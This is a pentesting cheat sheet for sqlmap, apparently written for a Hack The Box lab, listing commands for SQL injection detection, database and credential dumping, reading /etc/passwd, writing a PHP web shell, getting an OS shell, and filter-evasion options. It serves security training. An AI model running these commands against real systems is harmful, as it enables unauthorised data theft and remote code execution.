---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# SQLMap

## Commands

### Detection

{% tabs %}
{% tab title="URL (GET)" %}
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch -v 0
```
{% endtab %}

{% tab title="URL (POST)" %}
{% code overflow="wrap" %}
```bash
sqlmap -u "http://www.example.com/vuln.php"  --data "param=value" --batch -v 0
```
{% endcode %}
{% endtab %}

{% tab title="File" %}
```bash
sqlmap -r burp.req --batch -v 0
```
{% endtab %}

{% tab title="Aggresive" %}
```bash
sqlmap -r burp.req --batch -v 0 --level=5 --risk=3
```
{% endtab %}

{% tab title="Proxy" %}
```bash
sqlmap -r burp.req --batch -v 0 --proxy http://127.0.0.1:8080
```
{% endtab %}
{% endtabs %}

### Data Exfil

{% tabs %}
{% tab title="DB" %}
```bash
sqlmap -r burp.req --banner --current-user --current-db --is-dba --batch
```
{% endtab %}

{% tab title="Tables" %}
```bash
sqlmap -r burp.req -D testdb --tables --batch
```
{% endtab %}

{% tab title="Table Data" %}
```bash
sqlmap -r burp.req -D testdb -T testtable --dump --batch
```
{% endtab %}

{% tab title="Columns" %}
```bash
sqlmap -r burp.req -D testdb -T testtable --dump -C col1,col2 --batch
```
{% endtab %}

{% tab title="Rows" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req -D testdb -T testtable --dump -C --start=1 --stop=10 --batch
```
{% endcode %}
{% endtab %}

{% tab title="Schema" %}
```bash
sqlmap -r burp.req --schema --batch
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Cond Enum" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req -D testdb -T testtable --dump --where="col1 LIKE 'f%'" --batch -v 0
```
{% endcode %}
{% endtab %}

{% tab title="Full DB Enum" %}
```bash
sqlmap -r burp.req -D testdb --batch -v 0
```
{% endtab %}

{% tab title="Full DBMS" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req --dump-all --exclude-sysdbs --batch -v
```
{% endcode %}
{% endtab %}

{% tab title="Hail Mary" %}
```bash
sqlmap -r burp.req --all --batch -v 0
```
{% endtab %}
{% endtabs %}

### Advanced Data Exfil

{% tabs %}
{% tab title="Table Name" %}
```bash
sqlmap -r burp.req --search -T tableName --batch -v 0
```
{% endtab %}

{% tab title="Col Name" %}
```bash
sqlmap -r burp.req --search -C colName --batch -v 0
```
{% endtab %}

{% tab title="Connection Creds" %}
```bash
sqlmap -r burp.req --passwords --batch -v 0
```
{% endtab %}
{% endtabs %}

### OS Exploitation

{% tabs %}
{% tab title="Read" %}
```bash
sqlmap -r burp.req --batch -v 0 --file-read "/etc/passwd"
```
{% endtab %}

{% tab title="Write" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req --batch -v 0 --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
{% endcode %}
{% endtab %}

{% tab title="RCE" %}
```bash
sqlmap -r burp.req --batch -v 0 --os-shell
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
DBAs need certain privileges to be able to write files. Local access is also required such as write permissions in the directory we want to write to.
{% endhint %}

### Bypasses

{% tabs %}
{% tab title="Unique Value" %}
```bash
sqlmap -r burp.req --batch -v 0 --randomize=rp 
```
{% endtab %}

{% tab title="Calculated Param" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req --batch -v 0 --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```
{% endcode %}
{% endtab %}

{% tab title="Agent" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req --batch -v 0 --random-agent
```
{% endcode %}
{% endtab %}

{% tab title="Chunked" %}
```bash
sqlmap -r burp.req --batch -v 0 --chunked
```
{% endtab %}

{% tab title="HPP" %}
```bash
sqlmap -r burp.req --batch -v 0 -hpp
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Unicode Escape" %}
{% code overflow="wrap" %}
```bash
sqlmap -r burp.req --batch -v 0 --level=5 --risk=3 --tamper=charunicodeescape --delay 3
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Usage

{% hint style="info" %}
The lab used is from the [Web Enumeration & Exploitation](https://academy.hackthebox.com/module/163/section/1544) section of the[ Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163) module from HTB.
{% endhint %}

### cURL

Copy as `cURL` from browser's Network tab (Figure 1).

<figure><img src="../../../.gitbook/assets/sqlmap_curl_copy.png" alt=""><figcaption><p>Figure 1: Copying the cURL command via Mozilla's Network tab.</p></figcaption></figure>

Change `curl` to `sqlmap` (Figure 2). If a specific parameter needs to be tested, we can use the `*` as follows: `--data 'uid=1*&name=test'`.&#x20;

> _`--batch` chooses the defaults when prompted, `-v 0` reduces the verbosity level._

<figure><img src="../../../.gitbook/assets/sqlmap_curl2sqlmap.png" alt=""><figcaption><p>Figure 2: Changing cURL to sqlmap and we are good to go!</p></figcaption></figure>

### HTTP Requests

Capture the Request Headers and POST data via the browser or Burp (Figure 3).

> _From Mozilla `Copy Value` -> `Copy Request Headers` and then add the parameters via `Copy Value` -> `Copy POST Data`._

<figure><img src="../../../.gitbook/assets/sqlmap_copy_reqheaders_burp.png" alt=""><figcaption><p>Figure 3: Copying the POST request to a file with Burp Suite.</p></figcaption></figure>

Supply the file to SQLMap (Figure 4).

<figure><img src="../../../.gitbook/assets/sqlmap_req_file.png" alt=""><figcaption><p>Figure 4: Using SQLMap with a request file.</p></figcaption></figure>

## Resources

{% tabs %}
{% tab title="GitHub Repo" %}
{% embed url="https://github.com/sqlmapproject/sqlmap" %}
{% endtab %}

{% tab title="Wiki" %}
{% embed url="https://github.com/sqlmapproject/sqlmap/wiki/Introduction" %}
{% endtab %}
{% endtabs %}
